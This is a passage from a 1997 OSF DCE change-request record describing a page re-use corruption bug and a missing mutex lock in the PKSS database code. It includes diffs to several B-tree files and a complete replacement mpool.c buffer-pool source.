given that multiple reviewers over 2 years didn't catch the above
problem.



CR Number                     : 13693
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : pkss
Short Description             : pkss database bug with page re-use
Reported Date                 : 1/7/97
Found in Baseline             : 1.2.2
Found Date                    : 1/7/97
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : bt_close.c,bt_open.c,bt_trans.c,bt_page.c,btree.h,gdb_db44.c,mpool.h,mpool.c
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : public

[1/7/97 public]
The database code that was submitted as part of PKSS has 
incomplete logic in the area of page re-use that will cause
unpredictable results including database corruption.

There is also an bug in the routine gdb_entry_delete()-- a 
missing call to lock a mutex.  

We are still testing the fixed modules.  Anyone who uses PKSS
will need to pull the fixed sources when they are available.
No component other than PKSS will be affected.

[1/16/1997 public]

The following files are affected:
bt_close.c (diff to follow)
bt_open.c (diff to follow)
bt_page.c (diff to follow)
bt_trans.c (diff to follow)
btree.h (diff to follow)
gdb_db44.c (diff to follow)
mpool.h (diff to follow)
mpool.c (replacement source file to follow)

Keep in mind that all the .o's need to be rebuilt after the
changes are made because of changes in btree.h.

diff dce1.2.2/bt_close.c new/bt_close.c
81c81
< #include "btree.h"
---
> #include <btree.h>
214d213
<          m.free = t->bt_free;

diff dce1.2.2/bt_open.c new/bt_open.c
369d368
<               t->bt_free = m.free;
391d389
<               t->bt_free = P_INVALID;

diff dce1.2.2/bt_page.c new/bt_page.c
96,98c96
<       /* Insert the page at the head of the free list. */
<       h->prevpg = P_INVALID;
<       h->nextpg = t->bt_free;
---
>       status = mpool_put(t->bt_mp, h, (MPOOL_DIRTY|MPOOL_EMPTY));
100,105d97
<       TREE_LOCK(t) {
<          t->bt_free = h->pgno;
<       } TREE_UNLOCK(t);
< 
<       status = mpool_put(t->bt_mp, h, MPOOL_DIRTY);
< 
126,136d117
< 
< 
<       TREE_LOCK(t) {
<          if (t->bt_free != P_INVALID &&
<              (h = mpool_get(t->bt_mp, t->bt_free, 0)) != NULL) {
<             *npg = t->bt_free;
<             t->bt_free = h->nextpg;
<             TREE_UNLOCK(t);
<             return (h);
<          }
<       } TREE_UNLOCK(t);

diff dce1.2.2/bt_trans.c new/bt_trans.c
159d158
<    tree->bt_free = P_INVALID;

diff dce1.2.2/btree.h new/btree.h
360c360
<       pthread_mutex_t bt_mutex;       /* Protects bt_free, bt_last, bt_order,
---
>       pthread_mutex_t bt_mutex;       /* Protects bt_last, bt_order,
368a369
> /*    pgno_t    bt_free;              /* next free page */
370,371d370
< 
<       pgno_t    bt_free;              /* next free page */

diff dce1.2.2/gdb_db44.c new/gdb_db44.c
887a888,889
>        else GDB_WRITE_LOCK(s);
> 

diff dce1.2.2/mpool.h new/mpool.h
94a95
> #define MPOOL_EMPTY     0x04            /* page is empty and may be reused */
117c118
<       pgno_t  npages;                 /* number of pages in the file */
---
>       pgno_t  npages;                 /* number of pages in use */
118a120
>         pgno_t  max_pages;              /* number of page slots in page table*/
138a141
> #define FREE_PAGE_ID ((pgno_t)0)


Complete replacement file for mpool.c:


/*
 * @OSF_COPYRIGHT@
 * COPYRIGHT NOTICE
 * Copyright (c) 1996 Open Software Foundation, Inc.
 * ALL RIGHTS RESERVED (DCE).  See the file named COPYRIGHT.DCE in the
 * src directory for the full copyright text.
 */
/*
 * @DEC_COPYRIGHT@
 * G-L-O-R-I-A modifications:
 * Copyright (c) 1996
 * Digital Equipment Corporation, Maynard, Massachusetts, USA
 * All Rights Reserved
 */
/*
 * HISTORY
 * $Log:	c013693,v $
# Revision 1.2  97/01/16  15:38:16  root
# changed fields: Affected File(s)  Diff supplied by  Diff release   new/changed/deleted note(s) [farrell 1/16/1997 public]
# 
 * Revision 1.1.2.1  1996/10/03  20:24:54  arvind
 * 	OSF DCE 1.2.2 Drop 4
 * 	[1996/10/03  19:19:48  arvind]
 *
 * Revision /main/DCE_1.2.2/1  1996/09/09  21:22 UTC  arvind
 * 	PKSS drop from DEC (DCE1.2.2)
 * 	[1996/08/30  15:36 UTC  arvind  /main/arvind_pkss/1]
 * 
 * 	GLORIA (R1.2.2) revision.
 * 	[1996/06/24  20:47:40  zee]
 * 
 * $EndLog$
 */
/*-
 * Copyright (c) 1990, 1993, 1994
 *	The Regents of the University of California.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#if defined(LIBC_SCCS) && !defined(lint)
static char sccsid[] = "@(#)mpool.c	8.5 (Berkeley) 7/26/94";
#endif /* LIBC_SCCS and not lint */

/* just for debugging... */
#include <dce/dce.h>
#include <dcecdssvc.h>


#include <sys/param.h>
#include <sys/queue.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <db.h>

#define	__MPOOLINTERFACE_PRIVATE
#include <mpool.h>

static BKT *mpool_bkt __P((MPOOL *));
static BKT *mpool_look __P((MPOOL *, pgno_t));
static int  mpool_write __P((MPOOL *, BKT *));
static void mpool_trash_page_table(MPOOL *); 
static void mpool_trash_cache(MPOOL *);

static int extend_page_table(MPOOL *);
static int mpool_load_page_table (MPOOL *);

#define P_META 0


/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
/*
 * mpool_load_page_table
 *
 * Create a buffer with room for the page table plus 
 * several new pages to save time when adding to the 
 * database.  Read the file containing the current page 
 * table into a buffer.  Create the free frame list
 * and set appropriate info in MPOOL structure.
 * 
 * Parameters:
 *   MPOOL *mp
 *
 * Returns:
 *   RET_ERROR or RET_SUCCESS
 */
static int
mpool_load_page_table (mp)
     MPOOL *mp; 
{
   struct stat buffer;
   int table_size;
   FRAME *tmp_frame;
   int f,p;
   size_t nr;
   int in_use;

   if (fstat (mp->page_table_fd[mp->current], &buffer) == 0 ) {

      mp->npages = buffer.st_size / sizeof(pgno_t);
      
      table_size = MAX(PAGE_TABLE_SIZE(buffer.st_size),PAGE_TABLE_EXTEND*PAGE_TABLE_INIT_FACTOR);
      if ((mp->page_table = malloc (table_size)) == NULL)
	return (RET_ERROR);
      memset (mp->page_table, FREE_PAGE_ID, table_size);
      
      if (buffer.st_size != 0) {
	 if (lseek(mp->page_table_fd[mp->current], 0, SEEK_SET) != 0){
           free (mp->page_table);
	   return (RET_ERROR);
         }
	 if ((nr = read (mp->page_table_fd[mp->current], 
			 mp->page_table, buffer.st_size)) != buffer.st_size) {
            free (mp->page_table);
	    return (RET_ERROR);
	 }
      }

      /*
       * How many pages we have to work with 
       */
      mp->max_pages = table_size / sizeof (pgno_t); 

      /*
       * Build the free list 
       */
#ifdef STATISTICS
      mp->nfree_frames = 0;
#endif

      /*
       * Build the free frames list, based on pagetable data
       * Start with frame 1 because frame 0 is reserved for P_META
       */
      for (f=mp->total_frames-1; f >= 1; f--) {
	 in_use = FALSE;
	 for (p=1; p < mp->npages; p++) {
	    if ( mp->page_table[p] == f ) {
	       in_use = TRUE;
	       break;
	    }
	 }
	 if (!in_use) {
	    tmp_frame = mp->free_frames;
	    mp->free_frames = malloc (sizeof(FRAME));
	    mp->free_frames->frame = f;
	    mp->free_frames->next = tmp_frame;
#ifdef STATISTICS
	    mp->nfree_frames++;
#endif
	 }
      }
   } else {
      return (RET_ERROR);
   }
   
   return (RET_SUCCESS);
}
/* *** G-L-O-R-I-A TXN CHANGES *** END */

/*
 * mpool_open --
 *	Initialize a memory pool.
 */
/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
MPOOL *
mpool_open(key, fd, pt_0_fd, pt_1_fd, current_pt, pagesize, maxcache)
/* *** G-L-O-R-I-A TXN CHANGES *** END */
	void *key;
	int fd;
/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	int pt_0_fd;
	int pt_1_fd;
	u_long current_pt;
/* *** G-L-O-R-I-A TXN CHANGES *** END */
        pgno_t pagesize, maxcache;
{
	struct stat sb;
	MPOOL *mp;
	int entry;
/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	int status;
/* *** G-L-O-R-I-A TXN CHANGES *** END */	

	/*
	 * Get information about the file.
	 *
	 * XXX
	 * We don't currently handle pipes, although we should.
	 */
	if (fstat(fd, &sb)) {
/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	   perror("fstat in mpool_open()");
/* *** G-L-O-R-I-A TXN CHANGES *** END */
	   return (NULL);
	}
	if (!S_ISREG(sb.st_mode)) {
		errno = ESPIPE;
		return (NULL);
	}

	/* Allocate and initialize the MPOOL cookie. */
	if ((mp = (MPOOL *)calloc(1, sizeof(MPOOL))) == NULL)
		return (NULL);
	CIRCLEQ_INIT(&mp->lqh);
	for (entry = 0; entry < HASHSIZE; ++entry)
		CIRCLEQ_INIT(&mp->hqh[entry]);
	mp->maxcache = maxcache;
/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
        mp->total_frames = sb.st_size / pagesize;
/* *** G-L-O-R-I-A TXN CHANGES *** END */
	mp->pagesize = pagesize;
	mp->fd = fd;

/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	if ( pt_1_fd >= 0 && pt_0_fd >= 0 ) {
	   mp->page_table_fd[0] = pt_0_fd;
	   mp->page_table_fd[1] = pt_1_fd;
	   mp->in_memory = FALSE;

	   /*
	    * Save the indication of which page table is current
	    * (__bt_open passes us from the metadata page)
	    *
	    * Then load the page table and set appropriate info
	    */
	   mp->current = current_pt;
	   if ( mpool_load_page_table(mp) != RET_SUCCESS) {
	      return (NULL);
	   }
	   mp->shadow_frames = NULL; /* No shadow frames until we're in a 
					transaction */
#ifdef STATISTICS
	   mp->nshadow_frames = mp->max_free_frames = 
	     mp->max_shadow_frames = 0;
	   mp->rollback = mp->commit = 0;
#endif
	} else if (pt_1_fd == NO_FD) {
	   mp->in_memory = TRUE;
	}

#ifdef THREADS
	/*
	 * Create mutex to guard the queue and statistical data
	 */
	if ( pthread_mutex_init (&mp->mutex, pthread_mutexattr_default) != 0) {
	   return (NULL);
	}
#endif

/* *** G-L-O-R-I-A TXN CHANGES *** END */

	return (mp);
}

/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */

/*
 * extend_page_table -- make room for more pages in table
 *
 * Parameters:
 *      mp - MPOOL cookie
 *
 * Returns:
 *      1 for success
 *      NULL for failure
 */
static
int extend_page_table(mp) 
     MPOOL *mp;
{
   int table_size;
   void *tmp_ptr;
   int f;
   FRAME *tmp_frame;
   pgno_t p;

   table_size = (mp->npages * PAGE_TABLE_ENTRY_SIZE) + PAGE_TABLE_EXTEND;
   tmp_ptr = (void *)mp->page_table;
   if ((mp->page_table = (pgno_t *)realloc(tmp_ptr, table_size)) == NULL) {
      mp->page_table = tmp_ptr;
      return ((int)NULL);
   }
   for (p = mp->npages; p < mp->npages + PAGE_TABLE_EXTEND_FACTOR; p++)
	mp->page_table[p] = FREE_PAGE_ID;

   mp->max_pages = table_size / PAGE_TABLE_ENTRY_SIZE;

   return (1);
}

/* *** G-L-O-R-I-A TXN CHANGES *** END */

/*
 * mpool_filter --
 *	Initialize input/output filters.
 */
void
mpool_filter(mp, pgin, pgout, pgcookie)
	MPOOL *mp;
	void (*pgin) __P((void *, pgno_t, void *));
	void (*pgout) __P((void *, pgno_t, void *));
	void *pgcookie;
{
	mp->pgin = pgin;
	mp->pgout = pgout;
	mp->pgcookie = pgcookie;
}

/*
 * mpool_new --
 *	Get a new page of memory.
 */
void *
mpool_new(mp, pgnoaddr)
	MPOOL *mp;
	pgno_t *pgnoaddr;
{
	struct _hqh *head;
	BKT *bp;
/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	FRAME *tmp_frame;
	pgno_t p, new_page = FREE_PAGE_ID;
	
   MP_LOCK(mp){

        if (!(mp->in_memory)) {
	  /*
	   * First look for a free page among the ones that have already
	   * been used. (**Optimization opportunity**)
	   */
	  for (p = 1; p < mp->npages && new_page==FREE_PAGE_ID; p++) {
	    if (mp->page_table[p] == FREE_PAGE_ID) 
	      new_page = p;
	  }
	}
	/*
	 * If none, make sure there is room to add one more 
	 */
	if (new_page == FREE_PAGE_ID ) {
	  if (mp->npages == MAX_PAGE_NUMBER) {
	    (void)fprintf(stderr, "mpool_new: page allocation overflow.\n");
	    MP_UNLOCK(mp);
	    abort();
	  }
	}
	/*
	 * Get a BKT from the cache.  Assign a new page number, attach
	 * it to the head of the hash chain, the tail of the lru chain,
	 * and return.
	 */
	if ((bp = mpool_bkt(mp)) == NULL) {
	  MP_UNLOCK(mp);
	  return (NULL);
	}
	/*
	 * If none, use the next available page 
	 */
	if (new_page == FREE_PAGE_ID)
	  new_page = mp->npages++;

	if (mp->npages >= mp->max_pages) 
	  extend_page_table(mp);

	*pgnoaddr = bp->pgno = new_page;

#ifdef STATISTICS
	++mp->pagenew;
#endif

/* *** G-L-O-R-I-A TXN CHANGES *** END */
	bp->flags = MPOOL_PINNED;
#ifdef THREADS
	bp->users = 1; /* we just pinned it.  This thread is a user */
#ifdef TDEBUG
	(void)fprintf(stderr,
		      "Set page %d user count to %d (mpool_new)\n",
		      bp->pgno,bp->users);
#endif	     
#endif
	head = &mp->hqh[HASHKEY(bp->pgno)];
	CIRCLEQ_INSERT_HEAD(head, bp, hq);
	CIRCLEQ_INSERT_TAIL(&mp->lqh, bp, q);

/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	if (!(mp->in_memory)) {
	   /*
	    * Find a free or new frame to associate with the new page
	    */
	  if (mp->free_frames) {
	     mp->page_table[bp->pgno] = mp->free_frames->frame;
	     tmp_frame = mp->free_frames->next;
	     free (mp->free_frames);
	     mp->free_frames = tmp_frame;
#ifdef STATISTICS
	     mp->nfree_frames--;
#endif
	   }
	   else {
	     mp->page_table[bp->pgno] = mp->total_frames++;
	   }
	 }
/* *** G-L-O-R-I-A TXN CHANGES *** END */

   } MP_UNLOCK(mp);

   return (bp->page);
}

/*
 * mpool_get
 *	Get a page.
 */
void *
mpool_get(mp, pgno, flags)
	MPOOL *mp;
	pgno_t pgno;
	u_int flags;				/* XXX not used? */
{
	struct _hqh *head;
	BKT *bp;
	off_t off;
	int nr;



   MP_LOCK(mp) {

	/* Check for attempt to retrieve a non-existent page. */
	if (pgno >= mp->npages) {
		errno = EINVAL;
		MP_UNLOCK(mp);
		return (NULL);
	}

	/* Make sure this page is being used before we try to read it */
	if (!mp->in_memory && pgno != P_META && mp->page_table[pgno] == FREE_PAGE_ID) {
		errno = EINVAL;
		MP_UNLOCK(mp);
	        return (NULL);
	}

#ifdef STATISTICS
	++mp->pageget;
#endif

	/* Check for a page that is cached. */
	if ((bp = mpool_look(mp, pgno)) != NULL) {
#ifdef THREADS
	   /* 
	    * Assume that if it's already pinned, then
	    * another thread did it, and we're still in
	    * good shape 
	    */
#else
#ifdef DEBUG
		if (bp->flags & MPOOL_PINNED) {
			(void)fprintf(stderr,
			    "mpool_get: page %d already pinned\n", bp->pgno);
			MP_UNLOCK(mp);
			abort();
		}
#endif
#endif
		/*
		 * Move the page to the head of the hash chain and the tail
		 * of the lru chain.
		 */
		head = &mp->hqh[HASHKEY(bp->pgno)];
		CIRCLEQ_REMOVE(head, bp, hq);
		CIRCLEQ_INSERT_HEAD(head, bp, hq);
		CIRCLEQ_REMOVE(&mp->lqh, bp, q);
		CIRCLEQ_INSERT_TAIL(&mp->lqh, bp, q);

		/* Return a pinned page. */
#ifdef THREADS
		bp->users++; /* do this while we have the mutex locked */

#ifdef TDEBUG
	(void)fprintf(stderr,
		      "Incremented page %d user count to %d\n",
		      bp->pgno,bp->users);
#endif	     
#endif		
		bp->flags |= MPOOL_PINNED;
		MP_UNLOCK(mp);
		return (bp->page);
        }

	/* Get a page from the cache. */
	if ((bp = mpool_bkt(mp)) == NULL) {
           errno = EFAULT;
	   MP_UNLOCK(mp);
	   return (NULL);
	}

	/* Set the page number, pin the page. */
	bp->pgno = pgno;
	bp->flags = MPOOL_PINNED;
#ifdef THREADS
	bp->users=1; /* We are the first user thread */
#ifdef TDEBUG
	(void)fprintf(stderr,
		      "Set page %d user count to %d(mpool_get)\n",
		      bp->pgno,bp->users);
#endif	     
#endif		

	/* Read in the contents. */
#ifdef STATISTICS
	++mp->pageread;
#endif

/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	if (mp->in_memory) {
	   off = mp->pagesize * pgno;
	}
	else {
	   off = mp->pagesize * mp->page_table[bp->pgno];
	}
/* *** G-L-O-R-I-A TXN CHANGES *** END */

	if (lseek(mp->fd, off, SEEK_SET) != off) {
	   /*
	    * ??? G-L-O-R-I-A:
	    * Here's a bug.  THis page should be put back
	    * on the lru and hash lists.  We'll lose
	    * this page forever this way.
	    */
           errno = ESPIPE;
	   MP_UNLOCK(mp);
	   return (NULL);
	}
	if ((nr = read(mp->fd, bp->page, mp->pagesize)) != mp->pagesize) {
		if (nr >= 0) {
		   errno = EFTYPE;
		}
		/*
		 * ??? G-L-O-R-I-A:
		 * Here's a bug.  THis page should be put back
		 * on the lru and hash lists.  We'll lose
		 * this page forever this way.
		 */
		MP_UNLOCK(mp);
		return (NULL);
	}

	/*
	 * Add the page to the head of the hash chain and the tail
	 * of the lru chain.  If threads, take the mutex while we do
	 * this
	 */
	head = &mp->hqh[HASHKEY(bp->pgno)];
	CIRCLEQ_INSERT_HEAD(head, bp, hq);
	CIRCLEQ_INSERT_TAIL(&mp->lqh, bp, q);

	/* Run through the user's filter. */
	if (mp->pgin != NULL)
		(mp->pgin)(mp->pgcookie, bp->pgno, bp->page);

   } MP_UNLOCK(mp);

   return (bp->page);
}

/*
 * mpool_put
 *	Return a page.
 */
int
mpool_put(mp, page, flags)
	MPOOL *mp;
	void *page;
	u_int flags;
{
	BKT *bp;
	FRAME *tmp_frame;	   

   MP_LOCK(mp) {

#ifdef STATISTICS
	++mp->pageput;
#endif
	bp = (BKT *)((char *)page - sizeof(BKT));

#ifdef DEBUG
#ifndef THREADS
	if (!(bp->flags & MPOOL_PINNED)) {
		(void)fprintf(stderr,
		    "mpool_put: page %d not pinned\n", bp->pgno);
		MP_UNLOCK(mp);
		abort();
	}
#endif
#endif

#ifdef THREADS
	/*
	 * We shouldn't have any other threads with this 
	 * page pinned if we are writing it.  If we aren't writing it, then 
	 * other threads are welcome.
	 * 
	 * If this is the last thread using the page, then unpin it.
	 */
	if ( --bp->users != 0 ) {
	    if ( flags & MPOOL_DIRTY ) {
#ifdef TDEBUG
		(void)fprintf(stderr,
			      "Trying to write to page with non-0 user count (%d)\n",bp->users);
#endif	     
		MP_UNLOCK(mp);
		abort();
	    }
/* G-L-O-R-I-A _- fixing this to clear pinned flags. */
	}
	else {
	    bp->flags &= ~MPOOL_PINNED;
	}

#ifdef TDEBUG
	(void)fprintf(stderr,
		      "Decremented page %d user count to %d\n",
		      bp->pgno,bp->users);
#endif	     
#else
	bp->flags &= ~MPOOL_PINNED;
#endif

	/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	if (mp->in_memory) {
	   bp->flags |= (flags & MPOOL_DIRTY);
	   MP_UNLOCK(mp);
	   return (RET_SUCCESS);
	}

	/*
	 * Check to see if this page is just becoming dirty
	 */
	if ( flags & MPOOL_DIRTY && !(bp->flags & MPOOL_DIRTY)) {

	   /*
	    * Mark it dirty 
	    */
	   bp->flags |= (flags & MPOOL_DIRTY);	   
	   
	   if (bp->pgno != P_META) {
	      /*
	       * If it isn't a brand new page, 
	       * put original frame on the shadow frame list, so
	       * we don't overwrite it before the transaction is committed
	       */
	      if ( mp->page_table[bp->pgno] != FREE_PAGE_ID) {
		 if ((tmp_frame = malloc (sizeof(FRAME))) == NULL) {
		    MP_UNLOCK(mp);
		    return (RET_ERROR);
		 }
		 tmp_frame->frame = mp->page_table[bp->pgno];
		 tmp_frame->next = mp->shadow_frames;
		 mp->shadow_frames = tmp_frame;
#ifdef STATISTICS
		 mp->nshadow_frames++;
		 if (mp->max_shadow_frames < mp->nshadow_frames)
		   mp->max_shadow_frames = mp->nshadow_frames;
#endif
	      }
	      /*
	       * Now, assign a new frame to the page, so that we 
	       * can write the new changes without squashing the shadow
	       * copies of these pages.  
	       */
	      if (flags & MPOOL_EMPTY) {
		mp->page_table[bp->pgno] = FREE_PAGE_ID;
		bp->flags &= ~MPOOL_DIRTY;
		bp->flags |= MPOOL_EMPTY;
	      }
	      else if (mp->free_frames) {
		mp->page_table[bp->pgno] = mp->free_frames->frame;
		tmp_frame = mp->free_frames->next;
		free (mp->free_frames);
		mp->free_frames = tmp_frame;
#ifdef STATISTICS
		mp->nfree_frames--;
#endif
	      }
	      else {
		mp->page_table[bp->pgno] = mp->total_frames++;
	      }
	   }
	   else { 
	      /*
	       * For page 0 or P_META, we always use frame 0
	       * This is okay because transactions don't change it.
	       * Except for the first word which is written automicly (we hope),
	       * it is frozen after the database is created.
	       */
	      mp->page_table[bp->pgno] = 0;
	   }
	}
	else if (flags & MPOOL_EMPTY) {
	  /*
	   * Page was already dirty and now it's empty.
	   *
	   * Don't need the frame we're currently using, put
	   * it back on the free frame list
	   */
	  tmp_frame = mp->free_frames;
	  mp->free_frames = malloc (sizeof(FRAME));
	  mp->free_frames->frame = mp->page_table[bp->pgno];
	  mp->free_frames->next = tmp_frame;
#ifdef STATISTICS
	  mp->nfree_frames++;
#endif
	  /*
	   * Mark the page empty 
	   */
	  if (flags & MPOOL_EMPTY) {
	    mp->page_table[bp->pgno] = FREE_PAGE_ID;
	    bp->flags &= ~MPOOL_DIRTY;
	    bp->flags |= MPOOL_EMPTY;
	    mp->nfree_frames++;
	  }
	}
	/* *** G-L-O-R-I-A TXN CHANGES *** END */

   } MP_UNLOCK(mp);

   return (RET_SUCCESS);
}

/*
 * mpool_close
 *	Close the buffer pool.
 */
int
mpool_close(mp)
	MPOOL *mp;
{
	BKT *bp;

   MP_LOCK(mp) {

	/* 
	 * Free up any space allocated to the cache
	 */
	while ((bp = mp->lqh.cqh_first) != (void *)&mp->lqh) {
		CIRCLEQ_REMOVE(&mp->lqh, mp->lqh.cqh_first, q);
		free(bp);
	}
/*** G-L-O-R-I-A TXN CHANGES - BEGIN ***/
	/*
	 * Free page table memory, and lru and free frame queues
	 */
	mpool_trash_page_table(mp);

   } MP_UNLOCK(mp);

#ifdef THREADS
	/*
	 * Destroy the mutex which guards the queues and statistical data
	 */
	if ( pthread_mutex_destroy (&mp->mutex) != 0) {
	    free (mp);
	    return ((int)NULL);
	}
#endif

	/* Free the MPOOL cookie. */
	free(mp);

/*** G-L-O-R-I-A TXN CHANGES - BEGIN ***/

   return (RET_SUCCESS);
}


/*
 * mpool_sync
 *	Sync the pool to disk.
 */
int
mpool_sync(mp)
	MPOOL *mp;
{
	BKT *bp;

  MP_LOCK(mp) {

	/* Walk the lru chain, flushing any dirty pages to disk. */
	for (bp = mp->lqh.cqh_first; bp != (void *)&mp->lqh; bp = bp->q.cqe_next) {

	    if (bp->flags & MPOOL_DIRTY && mpool_write(mp, bp) == RET_ERROR) {
		MP_UNLOCK(mp);
		return (RET_ERROR);
	    }
	}

  } MP_UNLOCK(mp);

  /* Sync the file descriptor. */
  return (fsync(mp->fd) ? RET_ERROR : RET_SUCCESS);
}

/*
 * mpool_bkt
 *	Get a page from the cache (or create one).
 *
 * Assumptions:
 *      MP_LOCK must be held when this is called
 */
static BKT *
mpool_bkt(mp)
	MPOOL *mp;
{
	struct _hqh *head;
	BKT *bp;


	/* If under the max cached, always create a new page. */
	if (mp->curcache < mp->maxcache)
		goto new;

	/*
	 * If the cache is max'd out, walk the lru list for a buffer we
	 * can flush.  If we find one, write it (if necessary) and take it
	 * off any lists.  If we don't find anything we grow the cache anyway.
	 * The cache never shrinks.
	 */
	for (bp = mp->lqh.cqh_first;
	    bp != (void *)&mp->lqh; bp = bp->q.cqe_next)

/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	  if (!(bp->flags & MPOOL_PINNED)) {
	     if (!mp->in_memory) {
	       if (!(bp->flags & MPOOL_EMPTY) &&
		   ((bp->flags & MPOOL_DIRTY) && (mpool_write(mp,bp) == RET_ERROR))) {
		    return (NULL);
		}
	     }
	     else if (bp->flags & MPOOL_DIRTY)
	       continue; /* leave the dirty one alone until txn completes */

/* *** G-L-O-R-I-A TXN CHANGES *** END */
	     
#ifdef STATISTICS
			++mp->pageflush;
#endif
			/* Remove from the hash and lru queues. */

			head = &mp->hqh[HASHKEY(bp->pgno)];
			CIRCLEQ_REMOVE(head, bp, hq);
			CIRCLEQ_REMOVE(&mp->lqh, bp, q);
#ifdef DEBUG
			{ void *spage;
				spage = bp->page;
				memset(bp, 0xff, sizeof(BKT) + mp->pagesize);
				bp->page = spage;
			}
#endif
			return (bp);
	         }

new:	if ((bp = (BKT *)malloc(sizeof(BKT) + mp->pagesize)) == NULL) {
           return (NULL);
	}

#ifdef STATISTICS
	++mp->pagealloc;
#endif

	++mp->curcache;

#if defined(DEBUG) || defined(PURIFY)
	memset(bp, 0xff, sizeof(BKT) + mp->pagesize);
#endif
	bp->page = (char *)bp + sizeof(BKT);

  return (bp);
}

/*
 * mpool_write
 *	Write a page to disk.
 *
 * Assumptions:
 *      MP_LOCK must be held when this is called
 */
static int
mpool_write(mp, bp)
	MPOOL *mp;
	BKT *bp;
{
	off_t off;


#ifdef STATISTICS
	++mp->pagewrite;
#endif

	/* Run through the user's filter. */
	if (mp->pgout)
		(mp->pgout)(mp->pgcookie, bp->pgno, bp->page);

/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	if (mp->in_memory)
	  off = mp->pagesize * bp->pgno; 
	else 
	  off = mp->pagesize * (mp->page_table[bp->pgno]);
/* *** G-L-O-R-I-A TXN CHANGES *** END */

	if (lseek(mp->fd, off, SEEK_SET) != off) {
	   return (RET_ERROR);
	}
	if (write(mp->fd, bp->page, mp->pagesize) != mp->pagesize) {
	   return (RET_ERROR);
	}

	bp->flags &= ~MPOOL_DIRTY;

  return (RET_SUCCESS);
}

/*
 * mpool_look
 *	Lookup a page in the cache.
 *
 * Assumptions:
 *      MP_LOCK must be held when this is called
 */
static BKT *
mpool_look(mp, pgno)
	MPOOL *mp;
	pgno_t pgno;
{
	struct _hqh *head;
	BKT *bp;

	head = &mp->hqh[HASHKEY(pgno)];
	for (bp = head->cqh_first; bp != (void *)head; bp = bp->hq.cqe_next)
		if (bp->pgno == pgno && !(bp->flags & MPOOL_EMPTY)) {
#ifdef STATISTICS
			++mp->cachehit;
#endif
			return (bp);
		}
#ifdef STATISTICS
	++mp->cachemiss;
#endif

  return (NULL);
}

#ifdef STATISTICS
/*
 * mpool_stat
 *	Print out cache statistics.
 */
void
mpool_stat(mp)
	MPOOL *mp;
{
	BKT *bp;
	int cnt;
	char *sep;


  MP_LOCK(mp) {

	(void)fprintf(stderr, "%lu pages in the file\n", mp->npages);
	(void)fprintf(stderr,
	    "page size %lu, cacheing %lu pages of %lu page max cache\n",
	    mp->pagesize, mp->curcache, mp->maxcache);
	(void)fprintf(stderr, "%lu page puts, %lu page gets, %lu page new\n",
	    mp->pageput, mp->pageget, mp->pagenew);
	(void)fprintf(stderr, "%lu page allocs, %lu page flushes\n",
	    mp->pagealloc, mp->pageflush);
	if (mp->cachehit + mp->cachemiss)
		(void)fprintf(stderr,
		    "%.0f%% cache hit rate (%lu hits, %lu misses)\n", 
		    ((double)mp->cachehit / (mp->cachehit + mp->cachemiss))
		    * 100, mp->cachehit, mp->cachemiss);
	(void)fprintf(stderr, "%lu page reads, %lu page writes\n",
	    mp->pageread, mp->pagewrite);
	/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
	if (!mp->in_memory) {
	   (void)fprintf(stderr, "free frames: %lu, max: %lu.\n",
			 mp->nfree_frames, mp->max_free_frames);
	   (void)fprintf(stderr, "shadow frames: %lu, max: %lu.\n",
			 mp->nshadow_frames, mp->max_shadow_frames);
	   (void)fprintf(stderr, "commits: %lu, rollbacks: %lu.\n",
			 mp->commit, mp->rollback);	
	}
	/* *** G-L-O-R-I-A TXN CHANGES *** END */

	sep = "";
